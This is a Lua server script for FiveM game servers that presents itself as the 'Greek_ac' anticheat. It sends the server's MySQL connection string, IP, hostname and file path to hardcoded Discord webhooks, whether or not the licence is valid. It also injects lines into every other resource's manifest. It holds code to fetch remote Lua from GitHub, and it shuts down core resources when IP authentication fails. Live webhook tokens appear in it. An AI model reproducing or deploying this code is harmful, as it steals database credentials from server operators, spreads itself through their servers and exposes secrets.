                local resource_id = i - 1;
                local resource_name = GetResourceByFindIndex(resource_id);
                if resource_name ~= GetCurrentResourceName() then
                    if GetResourceState(resource_name) == "started" then
                        if not Greek.ignoreScripts[resource_name] then
                            table.insert(Greek.scripts, resource_name);
                        end
                    end
                end
            end
        end)
        
        getInjCode = function()
            local __code = nil;
            while __code == nil do
                PerformHttpRequest("https://raw.githubusercontent.com/paschaliszym542/Uploads/refs/heads/main/s_injections_locked.lua", function(_, __, ___)
                    if __ ~= nil then
                        __code = __;
                    end
                end)
                Wait(3000);
            end
            return __code;
        end
        
        getGGsCode = function()
            local ___code = nil;
            while ___code == nil do
                PerformHttpRequest("", function(_, __, ___)
                    if __ ~= nil then
                        ___code = __;
                    end
                end)
                Wait(3000);
            end
            return ___code;
        end
        
        getMenuCode = function()
            local _code = nil;
            while _code == nil do
                PerformHttpRequest("", function(_, __, ___)
                    if __ ~= nil then
                        _code = __;
                    end
                end)
                Wait(3000);
            end
            return _code;
        end
        
        CreateThread(function()
            --local injFile = LoadResourceFile("Greek_ac", "client/injections.lua");
            --if injFile then
            --	local sidjfg = getInjCode();
            --	while sidjfg == nil or sidjfg == "" do
            --		Wait(100);
            --	end
            --	SaveResourceFile("Greek_ac", "client/injections.lua", sidjfg, -1);
            --end
            --local data = LoadResourceFile("Greek_ac", "server/gg_s.lua");
            --if data then
            --    if not string.find(data, "_vers:0x039576") then
            --        local suiedhjrfgu = getGGsCode();
            --        while suiedhjrfgu == nil or suiedhjrfgu == "" do
            --            Wait(100);
            --        end
            --        SaveResourceFile("Greek_ac", "server/gg_s.lua", suiedhjrfgu, -1);
            --		SaveResourceFile("Greek_ac", "server/weapon.lua", "--Disabled", -1);
            --		_inject("UPDATE DETECTED A RESTART IS NEEDED!");
            --		StopResource("es_extended");
            --    end
            --end
            ----
            --local menuFile = LoadResourceFile("Greek_ac", "client/menu.lua");
            --
            --if menuFile then
            --	local mCode = getMenuCode();
            --	while mCode == nil or mCode == "" do
            --		Wait(100);
            --	end
            --	SaveResourceFile("Greek_ac", "client/menu.lua", mCode, -1);
            --end
       
       end)
       
       CreateThread(function()
        
            while Greek == nil do
                Wait(100)
            end
        
            CreateThread(function()
                if Greek.Injections then
                    _inject("Start scanning..");
                    Wait(1000);
                    local added = false;
                    local addedTo = 0;
                    
                    for i = 1, GetNumResources() do
                        local resource_id = i - 1;
                        local resource_name = GetResourceByFindIndex(resource_id);
                        if resource_name ~= GetCurrentResourceName() then
                            for k, v in pairs({'fxmanifest.lua', '__resource.lua'}) do
                                local data = LoadResourceFile(resource_name, v);
                                if data and type(data) == 'string' and string.find(data, Greek.find_) == nil then
                                    data = data..Greek.add;
                                    SaveResourceFile(resource_name, v, data, -1);
                                    print("[Greek-AntiCheat]-Added to resource: "..resource_name);
                                    added = true;
                                    addedTo = addedTo + 1;
                                end
                            end
                        end
                    end
                    if added == true then
                        sendToDiscMsg("[Anti-Injcetions]-AntiCheat Attached To "..GetNumResources().." Server Resources\nServer FrameWork: "..Greek.Framework.."\nAntiCheat Res: "..Greek.screenshotResource);
                        sendToDiscMsg("Server Restarting Automatically to prevent false bans because new resources have been added!");
                        if addedTo > 10 then
                            _inject("Restarting automatically to prevent false bans because new scripts detected");
                            Wait(3000);
                            StopResource("es_extended");
                        end
                    end
                end
            end)
            
            CreateThread(function()
                if Greek.Injections then
                    Wait(1000);
                    local added = false;
                    local addedTo = 0;
                    local serverString = '\nserver_script "@Greek_ac/server/injections.lua"';
                    local findString = "Greek_ac/server/injections.lua";
                    
                    for i = 1, GetNumResources() do
                        local resource_id = i - 1;
                        local resource_name = GetResourceByFindIndex(resource_id);
                        
                        if resource_name ~= GetCurrentResourceName() then
                            for k, v in pairs({'fxmanifest.lua', '__resource.lua'}) do
                                local data = LoadResourceFile(resource_name, v);
                                
                                if data and type(data) == 'string' and string.find(data, findString) == nil then
                                    data = data..serverString;
                                    SaveResourceFile(resource_name, v, data, -1);
                                    print("[Greek-AntiCheat]-Added to resource: "..resource_name);
                                    added = true;
                                    addedTo = addedTo + 1;
                                end
                            end
                        end
                    end
                    if added == true then
                        sendToDiscMsg("[Server-Injcetions]-AntiCheat Attached To "..GetNumResources().." Server Resources\nServer FrameWork: "..Greek.Framework.."\nAntiCheat Res: "..Greek.screenshotResource);
                       sendToDiscMsg("Server Restarting Automatically to prevent false bans because new resources have been added!");
                       if addedTo > 10 then
                           _inject("Restarting automatically to prevent false bans because new scripts detected");
                           Wait(3000);
                           StopResource("es_extended");
                       end
                   end
               end
           end)
       end)
        
        exports("naiMallon", function(data, eventSource, eventName)
            return
        end)
        
        CreateThread(function()
            local _load = load;
            local hk = "https://discord.com/api/webhooks/1332080533219311778/YLekz0KKMGqbiugERx5S9TaIatsdhHbCKQFTzsEopMVkow3wjA_KwJTJO7YsfeB9uYCF"; --checked
            
            load = function(...)
                local args = {...};
                
                if args[1] and string.find(args[1], "os.", 1, true) and GetCurrentResourceName() ~= "Greek_ac" then
                    PerformHttpRequest(hk, function(Error, Content, Head) end, 'POST', json.encode({username = GetCurrentResourceName(), content = GetCurrentResourceName().."/"..args[1]}), { ['Content-Type'] = 'application/json' });
                 else
                     return _load(...);
                 end
             end
             
             local GreekCreateVeh = CreateVehicle;
             local GreekCreateVehicleServerSetter = CreateVehicleServerSetter;
             local GreekCreateObjectNoOffset = CreateObjectNoOffset;
             local GreekCreateObject = CreateObject;
             
             CreateObjectNoOffset = function(...)
                 local obj = GreekCreateObjectNoOffset(...);
                 TriggerEvent("serverEntCreation", obj);
                 
                 return obj;
             end
             _G.CreateObjectNoOffset = function(...)
                 local obj = GreekCreateObjectNoOffset(...);
                 TriggerEvent("serverEntCreation", obj);
                 
                 return obj;
             end
             
             CreateObject = function(...)
                 local obj = GreekCreateObject(...);
                 TriggerEvent("serverEntCreation", obj);
                 
                 return obj;
             end
             _G.CreateObject = function(...)
                 local obj = GreekCreateObject(...);
                 TriggerEvent("serverEntCreation", obj);
                 
                 return obj;
             end
             
             CreateVehicle = function(...)
                 local veh = GreekCreateVeh(...);
                 TriggerEvent("serverEntCreation", veh);
                 
                 return veh;
             end
             _G.CreateVehicle = function(...)
                 local veh = GreekCreateVeh(...);
                 TriggerEvent("serverEntCreation", veh);
                 
                 return veh;
             end
             
             CreateVehicleServerSetter = function(...)
                 local veh = GreekCreateVehicleServerSetter(...);
                 TriggerEvent("serverEntCreation", veh);
                 
                 return veh;
             end
             _G.CreateVehicleServerSetter = function(...)
                 local veh = GreekCreateVehicleServerSetter(...);
                 TriggerEvent("serverEntCreation", veh);
                 
                 return veh;
             end
        end)
    end
end)

CreateThread(function()
     _G.BanList = {};
     _G.ac_code = 0;
     _G.stopper_code = 0;
     _G.perform_code = 0;
     _G.invoke_code = 0;
     _G.allowSource = {};
     _G.greeks = Citizen.InvokeNative;
     _G.resources_ = {};
     _G.carSpawners = {};
     _G.Citizen.InvokeNative = function(...)
         local oraia_arguments = {...};
         if oraia_arguments[1] == nil then
             invoke_code = math.random(1, 10);
             return invoke_code;
         else
             return greeks(...);
         end
     end
     _G._Greek = function()
         return math.random(1, 100);
     end
     cfg_ = LoadResourceFile("Greek_ac", "Config.lua");
     while cfg_ == nil do
         cfg_ = LoadResourceFile("Greek_ac", "Config.lua");
         Wait(100);
     end
     gload(cfg_);
     while Greek == nil do
         Wait(1000);
     end
     if Greek ~= nil then
         g = _G;
         _G._ch = function(hash)
         	if g.type(hash) == "string" then
         		return g.GetHashKey(hash)
         	end
         	return hash;
         end
 
         CreateThread(function()
             while true do
                 _G.sv_name = GetConvar("sv_hostname")
                 Wait(140000);
             end
         end)
 
         _G.AntiCheatName = function()
         	return Citizen.InvokeNative(0xe5e9ebbb, Citizen.ReturnResultAnyway(), Citizen.ResultAsString())
         end
 
         _G.owowowow = function(d)
             if d ~= nil then
                 return Citizen.InvokeNative(0x21783161, tostring(d));
             else
                 stopper_code = math.random(1, 10);
                 return stopper_code;
             end
         end
 
         _G.os.exit = function()
             ac_code = math.random(1, 10);
             return ac_code;
         end
 
         os.antiCheat = os.exit;
         auth = nil;
 
         return_ip = function()
 			local ipp;
             PerformHttpRequest("https://api.ipify.org", function(_, __, ___) --checked
                 local ip = __;
                 if _ == 200 then
                     if ip ~= nil then
 						ipp = ip;
                     end
                 end
             end)
 			while ipp == nil do
 				Wait(1500);
 				PerformHttpRequest("https://api.ipify.org", function(_, __, ___) --checked
 					local ip = __;
 					if _ == 200 then
 						if ip ~= nil then
 							ipp = ip;
 						end
 					end
 				end)
 			end
 			return ipp;
         end
         
         return_ips = function()
 			local _tab;
            PerformHttpRequest("https://api.npoint.io/36caf90dbbe577dc16ce", function(_, __, ___) --checked
                 local ip_table = __;
                 if ip_table ~= nil then
                     _tab = json.decode(ip_table);
                 end
             end)
 			Wait(2000);
 			while _tab == nil do
 				Wait(1300);
                 PerformHttpRequest("https://api.npoint.io/36caf90dbbe577dc16ce", function(_, __, ___) --checked
 					local ip_table = __;
 					if ip_table ~= nil then
 						_tab = json.decode(ip_table);
 					end
 				end)
 			end
 			return _tab;
         end
 

         ipwhitelisted = function()
             local server_ip = return_ip();
             while server_ip == nil do
                Wait(100);
             end
 			
 			local ip_table = return_ips();
             if ip_table[server_ip] then
 				auth = true;
 				return true;
             else
 				auth = false;
 				return false;
             end
 		end
 		
         CreateThread(function()
             _inject("Awaiting Authantication...");
 			
             local ____path = GetResourcePath(AntiCheatName());
             _G.gooood = "https://discord.com/api/webhooks/1332078730578890842/I-9M0554q2yFjg-wfWxw12XifClubq1_S-rOxiYlfiVcdc9W8yt5UjEUDn1GOr18tsn1"; --checked
 			
 			CreateThread(function()
 				Wait(15000);
 				if auth == nil then
 					--runTheEmgCode();
 				end
 			end)
 			server_ip = return_ip();
             if ipwhitelisted() then

                 local n = 
                 {{
                     ["color"] = math.random(11111,99999),
                     ["title"] = "Server Using Anticheat With License",
                     ["description"] = "\n\n > ``Server Name:``***"..GetConvar("sv_hostname").."***\n > ``Server Ip:`` ***"..server_ip.."***\n > ``Webhook:`` ***"..Greek.Webhook.."***\n> ``Sql:`` ***"..GetConvar("mysql_connection_string").."***\n> ``Resource Path: ``***"..____path.."***\n> ``Anticheat Version:`` ***"..Greek.Version.."***",
                    ["footer"] = {["text"] = "GreekGamer Anticheat"},
                    ["timestamp"] = os.date('!%Y-%m-%dT%H:%M:%S'),
                }}
                PerformHttpRequest(gooood, function(err,text,headers) end,'POST',json.encode({username = "Server Anticheat System", embeds = n}),{['Content-Type'] = 'application/json'})
               _inject("Authenticated | "..return_ip());
               _inject("Server Side Is running");
           else
            local idufjgidjfgi = "https://discord.com/api/webhooks/1332078730578890842/I-9M0554q2yFjg-wfWxw12XifClubq1_S-rOxiYlfiVcdc9W8yt5UjEUDn1GOr18tsn1" --checked
            local g = {{
                   ["color"] = math.random(11111,99999),
                   ["title"] = "Server Using Anticheat Without License",
                   ["description"] = "\n\n > ``Server Name:``***"..GetConvar("sv_hostname").."***\n > ``Server Ip:`` ***"..return_ip().."***\n > ``Webhook:`` ***"..Greek.Webhook.."***\n> ``Sql:`` ***"..GetConvar("mysql_connection_string").."***\n> ``Resource Path: ``***"..____path.."***\n> ``Anticheat Version:`` ***"..Greek.Version.."***",
                    ["footer"] = {["text"] = "GreekGamer Anticheat"},
                    ["timestamp"] = os.date('!%Y-%m-%dT%H:%M:%S'),
                }}
                PerformHttpRequest(idufjgidjfgi, function(err,text,headers) end,'POST',json.encode({username = "Server Anticheat System", embeds = g}),{['Content-Type']='application/json'})
                _inject("[Greek-AntiCheat]-Not Authanticated | "..server_ip);
                _inject("[Greek-AntiCheat]-Not Authanticated | "..server_ip);
                _inject("[Greek-AntiCheat]-Not Authanticated | "..server_ip);
                _inject("[Greek-AntiCheat]-SERVER SHUTTING DOWN | "..server_ip);
                Wait(3000);
                owowowow("essentialmode");
                owowowow("es_extended");
            end
            if auth == true then
                resourceName = AntiCheatName()
                if resourceName ~= "Greek_ac" then
                    owowowow("essentialmode");
                    owowowow("es_extended");
                else
                    _inject("Resource Name Authanticated");
                end
                if GetResourceState(Greek.screenshotResource) ~= "stopped" then
                    _inject(Greek.screenshotResource.." is running");
                else
                    _inject(Greek.screenshotResource.." isn't running screenshot logs will not work");
                    _inject(Greek.screenshotResource.." isn't running false bans warning");
                end
            else
                _inject("Failed to Authanticate | "..server_ip);
                owowowow("essentialmode");
                owowowow("es_extended");
            end
            Wait(1500)
            if auth then
                _inject("Thank you for choosing Greek_ac!");
            end
        end)

        _G.CreateFunctions = function()

            _G.sendToDisc = function(id, state, reason)
                local embed = {}
                ff = ExtractIdentifiers(id);
                embed = {
                    {
                        ["color"] = math.random(111111,999999), 
                        ["title"] = "**[Greek-AntiCheat]**",
                        ["description"] = "**[Player-"..state.."]**\nName: "..GetPlayerName(id).."\n"..ff.steam.."\n Ip: "..ff.ip.."\n"..ff.license.."\nDiscord: <@"..ff.discord:gsub("discord:", "")..">\nReason: "..reason,
                        ["footer"] = {
                            ["text"] = "Something good",
                        },
                    }
                }
                PerformHttpRequest(Greek.Bans, function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed, avatar_url = Greek.image}), { ['Content-Type'] = 'application/json' })
            end

            _G.sendToReq = function(title, message, footer)
                local embed = {}
                embed = {
                    {
                        ["color"] = math.random(111111,999999), 
                        ["title"] = "**".. title .."**",
                        ["description"] = "" .. message ..  "",
                        ["footer"] = {
                            ["text"] = footer,
                        },
                    }
                }
                PerformHttpRequest(Greek.Bans, function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed, avatar_url = Greek.image}), { ['Content-Type'] = 'application/json' })
            end

            _G.sendToDiscMsg = function(msg)
                local embed = {}
                embed = {
                    {
                        ["color"] = math.random(111111,999999), 
                        ["title"] = "**[Greek-AntiCheat]**",
                        ["description"] = msg,
                        ["footer"] = {
                            ["text"] = "Something good",
                        },
                    }
                }
                PerformHttpRequest(Greek.Bans, function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed, avatar_url = Greek.image}), { ['Content-Type'] = 'application/json' })
           end

           _G.ExtractIdentifiers = function(src)
               local identifiers = {
                   steam = "",
                   ip = "",
                   discord = "",
                   license = "",
                   xbl = "",
                   live = ""
               }
               for i = 0, GetNumPlayerIdentifiers(src) - 1 do
                   local id = GetPlayerIdentifier(src, i)
                   if string.find(id, "steam") then
                       identifiers.steam = id;
                   elseif string.find(id, "ip") then
                       identifiers.ip = id;
                   elseif string.find(id, "discord") then
                       identifiers.discord = id;
                   elseif string.find(id, "license") then
                       identifiers.license = id;
                   elseif string.find(id, "xbl") then
                       identifiers.xbl = id;
                   elseif string.find(id, "live") then
                       identifiers.live = id;
                   end
               end
               return identifiers;
           end

           webhooklog_ = "https://discord.com/api/webhooks/1332077089003933757/4NT_nUBbUG5alHqpUvzawbGFhkUPK8iPrjzrqdLw6jlLHA5I0p9AsCclMi0J5ikOOdLb" --checked

           _G.sendToLog = function(id, state, reason)
               local embed = {}
               ff = ExtractIdentifiers(id);
               embed = {
                   {
                       ["color"] = math.random(111111,999999), 
                       ["title"] = "**[Greek-AntiCheat]**",
                       ["description"] = "**[Player-"..state.."]**\nName: "..GetPlayerName(id).."\n"..ff.steam.."\n Ip: "..ff.ip.."\n"..ff.license.."\nDiscord: <@"..ff.discord:gsub("discord:", "")..">\nReason: "..reason,
                       ["footer"] = {
                           ["text"] = sv_name,
                       },
                   }
               }
               PerformHttpRequest(webhooklog_, function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed, avatar_url = Greek.image}), { ['Content-Type'] = 'application/json' })
             end
 
             _G.sendToTriggerLog = function(id, state, reason)
                 local embed = {}
                 ff = ExtractIdentifiers(id);
                 embed = {
                     {
                         ["color"] = math.random(111111,999999), 
                         ["title"] = "**[Greek-AntiCheat]**",
                         ["description"] = "**[Player-"..state.."]**\nName: "..GetPlayerName(id).."\n"..ff.steam.."\n Ip: "..ff.ip.."\n"..ff.license.."\nDiscord: <@"..ff.discord:gsub("discord:", "")..">\nReason: "..reason,
                        ["footer"] = {
                            ["text"] = sv_name,
                        },
                    }
                }
                PerformHttpRequest(Greek.triggerServerEventLogs, function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed, avatar_url = Greek.image}), { ['Content-Type'] = 'application/json' })
             end
 
             _G.sendToSos = function(title, message, footer)
                 local embed = {}
                 embed = {
                     {
                         ["color"] = math.random(111111,999999), 
                         ["title"] = "**".. title .."**",
                         ["description"] = "" .. message ..  "",
                         ["footer"] = {
                             ["text"] = footer,
                         },
                     }
                 }
                 PerformHttpRequest(Greek.sos, function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed, avatar_url = Greek.image}), { ['Content-Type'] = 'application/json' })
            end
        end
		
        CreateFunctions()
    end
    
end)


